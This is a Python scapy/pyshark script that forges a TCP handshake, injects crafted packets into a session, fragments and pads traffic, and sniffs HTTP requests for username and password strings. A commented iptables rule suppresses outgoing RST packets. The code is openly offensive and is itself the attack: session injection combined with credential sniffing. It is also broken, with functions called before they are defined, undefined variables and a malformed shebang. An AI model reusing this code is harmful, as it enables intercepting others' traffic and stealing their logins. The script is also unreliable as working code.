#!/bin/usr/env/python3
import  pyshark
from scapy.all import *
from random import randint
import StringIO
from multiprocessing import Process
import math
import os
import time




print("Started");

sip = "MY.SOURCE.IP.ADDRESS"
dip = "MY.DESTINATION.IP.ADDRESS"
sprt = 50000   #temporary
dprt = 60000

# HS
packetEther = Ether()
ip = IP(src = sip, dst = dip)
syn_packet = TCP(sport = sprt, dport = dprt, flags = "S", seq = 100)

synack_packet = sr1(ip/syn_packet)
my_ack = synack_packet.seq +1

ack_packet = TCP(sport = sprt, dport = dprt, flags = "A", seq = 101, ack = my_ack)
send(ip/ack_packet)

# SNIFFED from bettercap
capture = pyshark.LiveCapture(get_args(), display_filter='tcp')
# sniffed_pkts = rdpcap("/root/tmp/bettercap/monero_mining.pcap")

# sniffer(interface)
for packet in capture:
    p1 = Process(target = fragment_execute(capture, 500))
    p2 = Process(target = inserting_packet(4, 1000))

# iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

p1.start()
p2.start()

p1.join()
p2.join()

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest = 'interface', help = 'Interface Name for which packet is supposed to be captured.')
    options = parser.parse_args()
    
    if not options.interface:
        parser.error('[-] Please specify the name of the interface, use --help for more info.')
        
    return options.interface

def sniffer(interface):
    scapy.sniff(iface = interface, store = False, prn = process_packet)

def print_package(pkts):
    packet.show()

keywords = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name')

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in field_load:
                return field_load

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Requests/URL Requested -> {}'.format(url), '\n')
        cred = get_credentials(packet)
        if cred:
            print('\n\n[+] Possible Credential Information -> {}'.format(cred), '\n\n')

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')

#PACKET INSERTION
def inserting_packet(interval, attack_length):
    
    for i in range(atk_length):
        #IF YOU WANT TO SEND SINGLE FLAG PACKETS, SUCH AS ACK, PSH, SYN FLAG, ONLY USE FIRST FLAG

        #FIRST FLAG
        first_tcp = TCP(sport = sprt, dport = dprt, flags = "PA", seq = 101, ack = my_ack)
        first_load = packets[0].load
        response = sr1(ip/first_tcp/first_load)
        # -------
        #SECOND FLAG
        my_ack = response.seq
        my_seq = response.ack

        second_tcp = TCP(sport = sprt, dport = dprt, flags = "PA", seq = my_seq, ack = my_ack)
        second_load = packets[1].load
        send(ip/second_tcp/second_load)
        # -------

        time.sleep(interval) # SETTING TIME INTERVAL

def fragment_execute(packet, fragementsize):
    frags=fragment(packet,fragsize=fragementsize)
    print(print_package(packet))
    for f in frags:
        send(f)

def fragment(original_pkt, fragsize=1480):
    # Fragment a big IP datagram
    fragsize = (fragsize + 7) // 8 * 8
    lst = []
    for p in original_pkt:
        s = raw(p[IP].payload)
        nb = (len(s) + fragsize - 1) // fragsize

        for i in range(nb):
            q = p.copy()
            del(q[IP].payload)
            del(q[IP].chksum)
            del(q[IP].len)

            if i != nb - 1:
                q[IP].flags |= 1
            q[IP].frag += i * fragsize // 4
            r = conf.raw_layer(load=s[i * fragsize:(i + 1) * fragsize])
            r.overload_fields = p[IP].payload.overload_fields.copy()
            q.add_payload(r)
            lst.append(q)
    return lst

def modification_packet_TCP(sniffed_pkts, padding_num):
    if TCP in sniffed_pkts:
        pkts_request = sniffed_pkts.copy()
        load = pkts_request[3].load
        pad = Padding()
        pad.load = '\x00' * padding_num
        my_load = load[:27] + pad + load[28:]

        pushack_packet = TCP(sport = 963, dport = 111, flags = "PA", seq = 101, ack = my_ack)
        # print repr(load)
        # print repr(my_load)
        send(ip/pushack_packet/my_load)

def modification_packet_UDP(sniffed_pkts, padding_num):
    if UDP in sniffed_pkts:
        layer_after = sniffed_pkts[UDP].payload.copy()
        pad = Padding()
        pad.load = '\x00' * padding_num

        layer_before = packet.copy()
        layer_before[UDP].remove_payload()
        packet = layer_before / raw(pad) / layer_after
        send(packet)

def generate_dns_packet(dns_server, address):
    return IP(dst=dns_server)/UDP()/DNS(id=1,qd=DNSQR(qname=address))

def generate_arp_packet():
    return Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.1")

def generate_icmp_packet(address):
    return IP(dst=address)/ICMP()

def generate_tcp_packet(payload_size, fragsize=1460):
    payload = []
    num_frags = int(math.ceil(payload_size/float(fragsize))) - 1
    for i in range(0, num_frags):
        payload.append(str(i)*fragsize)

    payload.append(str(num_frags) * (payload_size - (fragsize * num_frags)))
    return IP()/TCP(flags="")/(''.join(payload))
    